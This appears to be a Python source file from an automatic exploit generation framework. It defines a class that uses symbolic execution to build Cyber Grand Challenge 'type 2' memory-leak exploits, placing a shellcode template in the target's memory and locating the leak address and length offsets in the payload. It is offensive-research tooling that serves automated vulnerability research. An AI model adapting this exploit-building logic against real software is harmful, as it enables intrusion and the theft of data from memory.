from rex import CannotExploit
from rex.exploit.cgc import CGCType2Exploit

class CGCType2ShellcodeExploit(CGCType2Exploit):
    '''
    A CGC type2 exploit object, which leaks the memory contents at an address with shellcode.
    '''

    def __init__(self, crash, shellcode_addr, shellcode_tmpl):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        :param register: the register set by the exploit
        :param shellcode_addr: address to place the shellcode in target's memory
        :param shellcode_tmpl: shellcode template object
        '''
        super(CGCType2ShellcodeExploit, self).__init__(crash, bypasses_nx=False, bypasses_aslr=False)

        self.method_name = 'shellcode'
        self._shellcode_addr = shellcode_addr
        self._shellcode_tmpl = shellcode_tmpl

        self._determine_indices()

    def __str__(self):
        return "shellcode type2"

    def _get_payload_with_value(self, address, length):

        sc = self._shellcode_tmpl.to_raw(address=address, length=length)
        sc_bvv = self.crash.state.se.BVV(sc)

        s = self.crash.state.copy()
        sc_mem = s.memory.load(self._shellcode_addr, len(sc))
        s.add_constraints(sc_mem == sc_bvv)

        return s.posix.dumps(0)

    def _determine_indices(self):

        # find value index
        c1 = self._get_payload_with_value(0x41414141, 0x11223344)
        # used as the basis for the bytearray in the exploit script
        self._raw_payload = c1
        c2 = self._get_payload_with_value(0x58585858, 0x11223344)

        # find out at what index difference the value exists in the payload
        for i in xrange(len(c1)-3):
            if all(x != y for (x, y) in zip(c1[i:i+4], c2[i:i+4])):
                self.addr_idx = i
                break

        if self.addr_idx is None:
            raise CannotExploit("unable to find value index in payload string")

        # find the index for the length to read
        w1 = self._get_payload_with_value(0x11223344, 0x41414141)
        w2 = self._get_payload_with_value(0x11223344, 0x58585858)

        for i in xrange(len(w1)-3):
            if all(x != y for (x, y) in zip(w1[i:i+4], w2[i:i+4])):
                self.size_idx = i
                break

        if self.size_idx is None:
            raise CannotExploit("unable to find final ip index in payload string")

        # find the index of the leak
        self.output_leak_idx = self.crash.state.se.any_int(self.crash.state.posix.files[1].pos)
